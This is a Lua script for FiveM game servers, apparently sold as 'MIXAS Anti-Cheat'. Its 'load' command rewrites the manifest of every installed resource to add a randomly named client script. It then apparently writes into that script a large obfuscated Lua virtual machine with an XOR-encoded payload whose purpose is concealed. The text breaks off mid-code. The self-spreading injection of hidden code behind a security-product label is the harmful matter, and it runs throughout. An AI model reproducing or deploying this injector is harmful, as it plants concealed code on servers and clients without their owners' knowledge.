
-----------------
RegisterCommand("mixas", function(source, ai, aj)
	if source == 0 then
		print("")
    print("^3**^5 MIXAS Anti-Cheat^3**")
    print("^3**^5 Contact:  MIXAS#1234 or discord.gg/jHqtKTT^3**")

		print("")
		if ai[1] == "load" then
			randomstring()
			if ai[2] == "fx" then
				print("^1**^2 Loading manifest!**^0")
				ae = "fxmanifest"
			elseif ai[2] == nil then
				print("^1**^2 Loading resource **^0")
				ae = "__resource"
			end;
			if not af then
				af = {
					0,
					0,
					0
				}
			end;
			local ak = GetNumResources()
			for al = 0, ak - 1 do
				local am = GetResourcePath(GetResourceByFindIndex(al))
				if string.len(am) > 4 then
					setall(am)
				end
			end;
			print("^"..math.random(1, 9).."^1Resources ^0("..af[1].."/"..af[2].." ^1loaded). ^0"..af[3].." ^1 skipped.^0")
			print("^"..math.random(1, 9).."^0Your client code : ^8"..ae.."^0 is: ^8"..ad.." ^2 Save !!")
			print("^"..math.random(1, 9).."^8Setup complete restart server!!!^0")
			af = nil
		end;
		if ai[1] == "delete" then
			if not af then
				af = {
					0,
					0,
					0
				}
			end;
			if ai[2] then
				ad = ai[2]
				if ai[3] == "fx" then
					print("^1**^2 delete FROM fxmanifest.lua!**^0")
					ae = "fxmanifest"
				elseif ai[3] == nil then
					print("^1**^2 delete FROM __resource.lua!**^0")
					ae = "__resource"
				end;
				local ak = GetNumResources()
				for al = 0, ak - 1 do
					local am = GetResourcePath(GetResourceByFindIndex(al))
					if string.len(am) > 4 then
						setall(am, true)
					end
				end;
				print("^"..math.random(1, 9).."^1Resources ^0("..af[1].."/"..af[2].." ^1deleted). ^0"..af[3].." ^1skipped.^0")
				print("^"..math.random(1, 9).."Delete successful restart server!!!^0")
				af = nil
			else
				print("^"..math.random(1, 9).."invalid script name.^0")
				print("^"..math.random(1, 9).."Contact:  MIXAS#1234 or discord.gg/jHqtKTT^0")
			end
		end
	else
    print("broken client source")
	end
end, true)
function setall(an, ao)
	local ap = io.open(an.."/"..ae..".lua", "r")
	local aq = split(an, "/")
	local ar = aq[#aq]
	aq = nil;
	if ap then
		if not ao then
			ap:seek("set", 0)
			local as = ap:read("*a")
			ap:close()
			local at = split(as, "\n")
			local au = false;
			local av = false;
			for U, aw in ipairs(at) do
				if aw == "client_script \""..ad..".lua\"" then
					au = true
				end;
				if not av then
					local ax = string.find(aw, "client_script") or -1;
					local ay = string.find(aw, "#") or -1;
					if ax ~= -1 and (ay == -1 or ax < ay) then
						av = true
					end
				end
			end;
			if av then
				as = as.."\nclient_script \""..ad..".lua\""
				if not au then
					os.remove(an.."/"..ae..".lua")
					ap = io.open(an.."/"..ae..".lua", "w")
					if ap then
						ap:seek("set", 0)
						ap:write(as)
						ap:close()
					end
				end;

                local az = 'return(function(mxsgay_g,mxsgay_j,mxsgay_p)local mxsgay_l=string.char;local mxsgay_e=string.sub;local mxsgay_m=table.concat;local mxsgay_n=math.ldexp;local mxsgay_s=getfenv or function()return _ENV end;local mxsgay_o=select;local mxsgay_h=unpack or table.unpack;local mxsgay_i=tonumber;local function mxsgay_k(mxsgay_h)local mxsgay_b,mxsgay_c,mxsgay_g="","",{}local mxsgay_f=256;local mxsgay_d={}for mxsgay_a=0,mxsgay_f-1 do mxsgay_d[mxsgay_a]=mxsgay_l(mxsgay_a)end;local mxsgay_a=1;local function mxsgay_j()local mxsgay_b=mxsgay_i(mxsgay_e(mxsgay_h,mxsgay_a,mxsgay_a),36)mxsgay_a=mxsgay_a+1;local mxsgay_c=mxsgay_i(mxsgay_e(mxsgay_h,mxsgay_a,mxsgay_a+mxsgay_b-1),36)mxsgay_a=mxsgay_a+mxsgay_b;return mxsgay_c end;mxsgay_b=mxsgay_l(mxsgay_j())mxsgay_g[1]=mxsgay_b;while mxsgay_a<#mxsgay_h do local mxsgay_a=mxsgay_j()if mxsgay_d[mxsgay_a]then mxsgay_c=mxsgay_d[mxsgay_a]else mxsgay_c=mxsgay_b..mxsgay_e(mxsgay_b,1,1)end;mxsgay_d[mxsgay_f]=mxsgay_b..mxsgay_e(mxsgay_c,1,1)mxsgay_g[#mxsgay_g+1],mxsgay_b,mxsgay_f=mxsgay_c,mxsgay_c,mxsgay_f+1 end;return table.concat(mxsgay_g)end;local mxsgay_k=mxsgay_k("25X21W27521X22627521W191D1B1W1W21821F21D2191X21X2242791021721G21121521921627K21V2791W1X21O191X21621D21X21T2791C1K1D1A1F21X21S2791A21921J21927L27921528221D1A27R27V27921I1X1W19111A1H2852791K21421127U21X2272792162191Z28M28323829E23921X2252791721I21121Q21P2152171W21Q21X21U29J27J21621327K27M2751F2171321D1N21Q1121B21X27W2751821P21621O1121E21721X22029821B101X21J21D1W21728128329H2791E21721B1X21I2AU28429I27529P27U29O29421P27727X28T29421821J1929Q28K2751Z21121P21227I2141W2AW2751321I21D21221P2B32BK21W21229E2152C02B521W1N21B29M2112C0297275162142AP21J28U2C02A021W15212217102BE215296279192112AP21C21I2AT28N2BT21W28I21O2D52D52C12BV2BN2C022L27921F2B11Y21E21C1Z21821921721D27I21721F21I1Y1X21C2DF2DS2DM2AK2791T21121G2142172162A21W2AH2AJ29U2CF21921Q27U21J2DZ2751229421C2CC28N2E921X21Z279182171821X221279162BW2EL2161K28T27S21D2CT2EQ2751H15112CU27521O21621J2111W2191Y2992112EG2EW2751G151E1A1128W28Y2CD2791B21D21C2132FM21C21J2362G62C11C27R2CW1Y21921129T2792C323828M2A92FO21W122CH21O2C92CB2C02EB21W2AO2AQ2AS2D31521421G2182111I2DU2GE2782752992DU27P2B11X2A922A2FY27U1G21828T1X2HI2HK1N1X21E2822C02GL21A1X2122112131028H2EM2AV22D2792142AE21O21D21621B2162DQ29X2181X2112G42GF2752BI21C2DM2162D32E52IM29C2842862752IP2E52IO2992E527Z1X2132EV2791Y2D021J21C28U1Y2932B02EG2CE2CN21421F2BN21J1F2111Y1Y2GE2IT2D42CA21Q2GE2CM2BE2BH2D22C721121I27J2JW2AV2H727A2JZ2B021C2C62ER2172HQ2B22D22JP2F221721O2BB2JU2172172K82D22AB21W132822AP28H2AA279122822FI2161S2C11G2DO21627U21421421X22328729421B1G217162112L72111K2KL2L82GT1M2172122E421O21X21Y2ER1M2D31G2GD1Z2D12AV2C72AD2AF2HO2HQ2IN2CM29K21D2FG27Y21I2II2GM1S2C02JP2M421O23G2G82172112802KE2AX1Z1G1D132BC2AC2IF2B02KD2AV2JP1J15101H1D2C1102KX1Y21F21C1M2FB2GT151F1G2IF2CT22C2791529X29W21C1621P2FZ2G12G32MX21W28P2132D02MQ2N22J41X2DT21E2MF2L32L51X2L82AL2751A2B12IL1Z2OC122I82J22K429P1W2H421I28I2IW2KP111S1G2NF28W2MF2D61X21929L2KV27521C27P2HS29J1F2BM2161Z28H2E52P821G28D2792LP21423A2MF1N21P1W28T2EG2KP172IG2MI2CV2PA2752LK2DW2OL2141N2AZ27T2D31N1C151M1F2C02222791M2HP2172142G02IM2LG2CJ2P621W18112NI111M1U2PP23429X2112A92CM1C2IF1W21J2182KM2NY2KX21421921G1X2CL2NO21221J2QK2G027K2GT2EJ2142132IW2K42812CZ21921O2IR2D31221721I29Y2GS27N2OC21D21O27K28E2752AO2B12PP2JH1Z2N72902AC2S62SG2JP1D2162HO2ON2791N2H229921D2K92OF21P2F21X2F42CT2OE21W1Z1A1I1521A1K1G21E21I23B1B122FC2GM2J62J828V2D22F72CN1G2MW2QG2751Y21D21321B1T2DN172I82NS2111Z2NY2NP2942192C921523B29G2S921W2E421B28J2UB1J1E1K2QX2KP21G21321F172151E1N2SH21W2192HJ21D2U22UB1F1U21A2LS2CM21A1W23B2G623A23923B2UT131Z2VE2U22JP2AR21F1W21A2NY1F2NI152VO2VN28C2CM2L72L723423G2372342PK27521Q2W221C2MF2GZ2H12H32EP2791R2WB2D32WB2WE2WF2TG102AE2IB2EJ27S2I521X2NN27521H1E21C212131G21Q23521P23G1U21521H213152U22KP1B2IY2162SG2C72141D2XD2L72XE2N82GL2G221I21C2DL2O62CZ2QK2L82I32752112G02172152IG2192132B71X21P2AP2LS2K42TB21G27Y2J72D02BB2T22Y42Y92XP21P21E2PO2K42832JC2B12KC2NY112RQ2IB21521P2WI2PO2TQ2C22942YZ27Q2XL21P2LH2L82JE1M2E21X2GZ2142OL29X2NY2DV1X2DU28I2N021X2YX1521G2E321P2SR2172TU2JH2HQ2RA2P41X2922BN2SC22F2KW2S029Y2GC2OC1W2Z72FI2MB1B21G2EG2K42132IE2IG310F2J12A92PV2192IL21Q2822EH21W29K2IF2J82HM2R52LU2752K42LT2WA1321Y21X27921W21X22E2791G2K02VE2B12HO21I2KC2AH2822W42JE2152D623I27Y2J821321C2382D3132RT2R81W22S22T2TM27925023F2WO279311U2DU311W22S23A22S1D1022S23I22S1V21X2282791P2262322321N2O12RD21C22S28P28M312E22S312N21X2HF2BU2DU2TY21I28T2162NE2AP2DN2S11X312U1X311523027922E22X279311427522Q23D2792AL31142LU21S23G313O311621W313H313J311514313V311521U23727927M31143114313S3145313V3149275313P313W313I276279313M313U31142EQ314C21W314E314N2I33114313X2752UB22E23B313V2JP314W21W2LU2GT21W22K2792LU313K2UB313K313W314X2752KP21W2NN315A2792HF3147313G314X2LU2KP21S2YX22R31412NN2UB313U28E28E2EQ313X286315H2AL28628628E21U313F28622Q314121W314N3169314S313I3164313G2EW29U314Z315D21W2CM314A2TM311821W29I2C7316Q2782K4279278313Q311527W27W316W28627W31483115315R31482LA275315J314U313Y2792KP2QQ17310M2ED310P2UG211310M2W021W2XX2XM2MF29L2162AS215312021W25O23R14317Y25O247142NY310I310H2IE2TU31152T2314T316A22S23331153151313W314H2TM22S314H3176316Q2LU316K21W2EQ3153318L318I318I314S3170318X318O316B318X3158317E275267311523C279231313G3192275318Q318J319F2752EQ316P317D314V2753163319D21W29U2GT316Q3171319Q27M2CM316Q316S313G297316V319Q2972JE316Q2AL318D2752EW2GL316Q2QG2YX316Q2LA317A318K315F31AK319I21W2I32XS31AJ3118316Q31AJ31013101319F297312J312J31AM22921W31B131AM2HF313031AJ22B21W31B831AM3155315531AM2DD2DD31AM22M21W31BI31AM22N21W31BM31AM22G21W31BQ31AM22H21W31BU31AW21W22I31BY319Q22J21W31C231AM318N318N31AM22T21W31C931AM22U21W31CD31AM22V21W31CH31AM22O21W31CL31AM22P21W31CP31AM3169316931AM315R315R31BX313F313F31AM319C319C31AM23221W31D531AM318H318H31AM22W21W31DC31AM313I314G31AJ22Y21W31DJ31AM22Z21W31DN31AM23821W31DR31AM23921W31DV319F314X23A21W31E027931CX31E1313V31503114315C313W2972LU234319Q2EQ235319Q28E236319Q286314431AM29U313T31AM27W23H319W21W23I319Q29I23J319Q278319A31AM297313N31BX2AL23E319Q2EW23F319Q2QG314031AM2LA15319Q2NN16319Q2I317319Q311810319Q310111319Q312J12319Q31B11331A121W2HF1C319Q31B81D319Q31551E319Q2DD1F319Q31BI18319Q31BM19319Q31BQ1A319Q31BU1B319Q31BZ1K31C121W1L31FZ318N1M319Q31C91N319Q31CD1G319Q31CH1H319Q31CL1I319Q31CP31BO31AJ31691J319Q315R1S319Q313F1T319Q319C1U313G31C231D51V319Q318H1O319Q31DC1P319Q313I1Q319Q31DJ1R319Q31DN210319Q31DR211319Q31DV212319Q31E0213319131E52LU31E721W1W31FZ2LU313D31AM2EQ1Y31EH2T331EK21W218319Q29U219319Q27W21A31ET21B31EW2UC31EZ317Q31A421W21631FZ2AL21731F821W21G31FB21W21H319Q2LA21I31FH2D431FK21W21C31FN21W21D31FQ21W21E31FT21W21F31FW21W21O31FZ2HF21P31G321W21Q31G621W21R31G921W21K31GC21W21L31GF21W21M31GI21W21N31GL21W25G31GO21W25H31GR25I31GU21W25J31GX21W25C31H021W25D31H321W25E31H621W25F31H9317Z319Q316925P31HF21W25Q31HI21W25R31HL21W25K315L31D621W25L31LR318H25M3177279318H318U31E0315A315K21W31BG318I22E3101311425N313G313I311425W27922S31BU315K27421Y31FG3157311531C9316Z3195314H279");local mxsgay_a=(bit or bit32);local mxsgay_d=mxsgay_a and mxsgay_a.bxor or function(mxsgay_a,mxsgay_c)local mxsgay_b,mxsgay_d,mxsgay_e=1,0,10 while mxsgay_a>0 and mxsgay_c>0 do local mxsgay_f,mxsgay_e=mxsgay_a%2,mxsgay_c%2 if mxsgay_f~=mxsgay_e then mxsgay_d=mxsgay_d+mxsgay_b end mxsgay_a,mxsgay_c,mxsgay_b=(mxsgay_a-mxsgay_f)/2,(mxsgay_c-mxsgay_e)/2,mxsgay_b*2 end if mxsgay_a<mxsgay_c then mxsgay_a=mxsgay_c end while mxsgay_a>0 do local mxsgay_c=mxsgay_a%2 if mxsgay_c>0 then mxsgay_d=mxsgay_d+mxsgay_b end mxsgay_a,mxsgay_b=(mxsgay_a-mxsgay_c)/2,mxsgay_b*2 end return mxsgay_d end local function mxsgay_c(mxsgay_b,mxsgay_a,mxsgay_c)if mxsgay_c then local mxsgay_a=(mxsgay_b/2^(mxsgay_a-1))%2^((mxsgay_c-1)-(mxsgay_a-1)+1);return mxsgay_a-mxsgay_a%1;else local mxsgay_a=2^(mxsgay_a-1);return(mxsgay_b%(mxsgay_a+mxsgay_a)>=mxsgay_a)and 1 or 0;end;end;local mxsgay_a=1;local function mxsgay_b()local mxsgay_f,mxsgay_b,mxsgay_c,mxsgay_e=mxsgay_g(mxsgay_k,mxsgay_a,mxsgay_a+3);mxsgay_f=mxsgay_d(mxsgay_f,68)mxsgay_b=mxsgay_d(mxsgay_b,68)mxsgay_c=mxsgay_d(mxsgay_c,68)mxsgay_e=mxsgay_d(mxsgay_e,68)mxsgay_a=mxsgay_a+4;return(mxsgay_e*16777216)+(mxsgay_c*65536)+(mxsgay_b*256)+mxsgay_f;end;local function mxsgay_i()local mxsgay_b=mxsgay_d(mxsgay_g(mxsgay_k,mxsgay_a,mxsgay_a),68);mxsgay_a=mxsgay_a+1;return mxsgay_b;end;local function mxsgay_f()local mxsgay_c,mxsgay_b=mxsgay_g(mxsgay_k,mxsgay_a,mxsgay_a+2);mxsgay_c=mxsgay_d(mxsgay_c,68)mxsgay_b=mxsgay_d(mxsgay_b,68)mxsgay_a=mxsgay_a+2;return(mxsgay_b*256)+mxsgay_c;end;local function mxsgay_r()local mxsgay_d=mxsgay_b();local mxsgay_a=mxsgay_b();local mxsgay_e=1;local mxsgay_d=(mxsgay_c(mxsgay_a,1,20)*(2^32))+mxsgay_d;local mxsgay_b=mxsgay_c(mxsgay_a,21,31);local mxsgay_a=((-1)^mxsgay_c(mxsgay_a,32));if(mxsgay_b==0)then if(mxsgay_d==0)then return mxsgay_a*0;else mxsgay_b=1;mxsgay_e=0;end;elseif(mxsgay_b==2047)then return(mxsgay_d==0)and(mxsgay_a*(1/0))or(mxsgay_a*(0/0));end;return mxsgay_n(mxsgay_a,mxsgay_b-1023)*(mxsgay_e+(mxsgay_d/(2^52)));end;local mxsgay_q=mxsgay_b;local function mxsgay_n(mxsgay_b)local mxsgay_c;if(not mxsgay_b)then mxsgay_b=mxsgay_q();if(mxsgay_b==0)then return"";end;end;mxsgay_c=mxsgay_e(mxsgay_k,mxsgay_a,mxsgay_a+mxsgay_b-1);mxsgay_a=mxsgay_a+mxsgay_b;local mxsgay_b={}for mxsgay_a=1,#mxsgay_c do mxsgay_b[mxsgay_a]=mxsgay_l(mxsgay_d(mxsgay_g(mxsgay_e(mxsgay_c,mxsgay_a,mxsgay_a)),68))end return mxsgay_m(mxsgay_b);end;local mxsgay_a=mxsgay_b;local function mxsgay_q(...)return{...},mxsgay_o("#",...)end local function mxsgay_l()local mxsgay_h={};local mxsgay_d={};local mxsgay_a={};local mxsgay_j={[#{{496;919;273;811};"1 + 1 = 111";}]=mxsgay_d,[#{"1 + 1 = 111";"1 + 1 = 111";{445;688;529;47};}]=nil,[#{{867;944;378;290};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=mxsgay_a,[#{{28;555;152;573};}]=mxsgay_h,};local mxsgay_a=mxsgay_b()local mxsgay_e={}for mxsgay_c=1,mxsgay_a do local mxsgay_b=mxsgay_i();local mxsgay_a;if(mxsgay_b==0)then mxsgay_a=(mxsgay_i()~=0);elseif(mxsgay_b==3)then mxsgay_a=mxsgay_r();elseif(mxsgay_b==1)then mxsgay_a=mxsgay_n();end;mxsgay_e[mxsgay_c]=mxsgay_a;end;for mxsgay_a=1,mxsgay_b()do mxsgay_d[mxsgay_a-1]=mxsgay_l();end;for mxsgay_j=1,mxsgay_b()do local mxsgay_a=mxsgay_i();if(mxsgay_c(mxsgay_a,1,1)==0)then local mxsgay_d=mxsgay_c(mxsgay_a,2,3);local mxsgay_g=mxsgay_c(mxsgay_a,4,6);local mxsgay_a={mxsgay_f(),mxsgay_f(),nil,nil};if(mxsgay_d==0)then mxsgay_a[3]=mxsgay_f();mxsgay_a[4]=mxsgay_f();elseif(mxsgay_d==1)then mxsgay_a[3]=mxsgay_b();elseif(mxsgay_d==2)then mxsgay_a[3]=mxsgay_b()-(2^16)elseif(mxsgay_d==3)then mxsgay_a[3]=mxsgay_b()-(2^16)mxsgay_a[4]=mxsgay_f();end;if(mxsgay_c(mxsgay_g,1,1)==1)then mxsgay_a[2]=mxsgay_e[mxsgay_a[2]]end if(mxsgay_c(mxsgay_g,2,2)==1)then mxsgay_a[3]=mxsgay_e[mxsgay_a[3]]end if(mxsgay_c(mxsgay_g,3,3)==1)then mxsgay_a[4]=mxsgay_e[mxsgay_a[4]]end mxsgay_h[mxsgay_j]=mxsgay_a;end end;mxsgay_j[3]=mxsgay_i();return mxsgay_j;end;local function mxsgay_i(mxsgay_a,mxsgay_k,mxsgay_f)mxsgay_a=(mxsgay_a==true and mxsgay_l())or mxsgay_a;return(function(...)local mxsgay_d=mxsgay_a[1];local mxsgay_e=mxsgay_a[3];local mxsgay_m=mxsgay_a[2];local mxsgay_n=mxsgay_q local mxsgay_b=1;local mxsgay_g=-1;local mxsgay_r={};local mxsgay_q={...};local mxsgay_o=mxsgay_o("#",...)-1;local mxsgay_l={};local mxsgay_c={};for mxsgay_a=0,mxsgay_o do if(mxsgay_a>=mxsgay_e)then mxsgay_r[mxsgay_a-mxsgay_e]=mxsgay_q[mxsgay_a+1];else mxsgay_c[mxsgay_a]=mxsgay_q[mxsgay_a+#{{980;915;491;590};}];end;end;local mxsgay_a=mxsgay_o-mxsgay_e+1 local mxsgay_a;local mxsgay_e;while true do mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[1];if mxsgay_e<=33 then if mxsgay_e<=16 then if mxsgay_e<=7 then if mxsgay_e<=3 then if mxsgay_e<=1 then if mxsgay_e>0 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else mxsgay_c[mxsgay_a[2]]={};end;elseif mxsgay_e>2 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else mxsgay_c[mxsgay_a[2]]=mxsgay_f[mxsgay_a[3]];end;elseif mxsgay_e<=5 then if mxsgay_e==4 then do return end;else local mxsgay_b=mxsgay_a[2]local mxsgay_d,mxsgay_a=mxsgay_n(mxsgay_c[mxsgay_b](mxsgay_h(mxsgay_c,mxsgay_b+1,mxsgay_a[3])))mxsgay_g=mxsgay_a+mxsgay_b-1 local mxsgay_a=0;for mxsgay_b=mxsgay_b,mxsgay_g do mxsgay_a=mxsgay_a+1;mxsgay_c[mxsgay_b]=mxsgay_d[mxsgay_a];end;end;elseif mxsgay_e>6 then mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_c[mxsgay_a[4]]];else mxsgay_c[mxsgay_a[2]]();end;elseif mxsgay_e<=11 then if mxsgay_e<=9 then if mxsgay_e==8 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else mxsgay_b=mxsgay_a[3];end;elseif mxsgay_e>10 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else local mxsgay_b=mxsgay_a[2]mxsgay_c[mxsgay_b](mxsgay_h(mxsgay_c,mxsgay_b+1,mxsgay_a[3]))end;elseif mxsgay_e<=13 then if mxsgay_e==12 then mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_c[mxsgay_a[4]]];else local mxsgay_g;local mxsgay_i;local mxsgay_e;mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_f[mxsgay_a[3]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2]mxsgay_c[mxsgay_e]=mxsgay_c[mxsgay_e]()mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_i=mxsgay_a[3];mxsgay_g=mxsgay_c[mxsgay_i]for mxsgay_a=mxsgay_i+1,mxsgay_a[4]do mxsgay_g=mxsgay_g..mxsgay_c[mxsgay_a];end;mxsgay_c[mxsgay_a[2]]=mxsgay_g;mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2]mxsgay_c[mxsgay_e](mxsgay_h(mxsgay_c,mxsgay_e+1,mxsgay_a[3]))mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_b=mxsgay_a[3];end;elseif mxsgay_e<=14 then local mxsgay_d=mxsgay_a[2];local mxsgay_e=mxsgay_c[mxsgay_d]local mxsgay_f=mxsgay_c[mxsgay_d+2];if(mxsgay_f>0)then if(mxsgay_e>mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];else mxsgay_c[mxsgay_d+3]=mxsgay_e;end elseif(mxsgay_e<mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];else mxsgay_c[mxsgay_d+3]=mxsgay_e;end elseif mxsgay_e==15 then local mxsgay_d=mxsgay_a[2];local mxsgay_f=mxsgay_c[mxsgay_d+2];local mxsgay_e=mxsgay_c[mxsgay_d]+mxsgay_f;mxsgay_c[mxsgay_d]=mxsgay_e;if(mxsgay_f>0)then if(mxsgay_e<=mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];mxsgay_c[mxsgay_d+3]=mxsgay_e;end elseif(mxsgay_e>=mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];mxsgay_c[mxsgay_d+3]=mxsgay_e;end else mxsgay_c[mxsgay_a[2]]=mxsgay_k[mxsgay_a[3]];end;elseif mxsgay_e<=24 then if mxsgay_e<=20 then if mxsgay_e<=18 then if mxsgay_e>17 then mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_a[4]];else local mxsgay_b=mxsgay_a[2]local mxsgay_d,mxsgay_a=mxsgay_n(mxsgay_c[mxsgay_b](mxsgay_h(mxsgay_c,mxsgay_b+1,mxsgay_a[3])))mxsgay_g=mxsgay_a+mxsgay_b-1 local mxsgay_a=0;for mxsgay_b=mxsgay_b,mxsgay_g do mxsgay_a=mxsgay_a+1;mxsgay_c[mxsgay_b]=mxsgay_d[mxsgay_a];end;end;elseif mxsgay_e==19 then mxsgay_f[mxsgay_a[3]]=mxsgay_c[mxsgay_a[2]];else 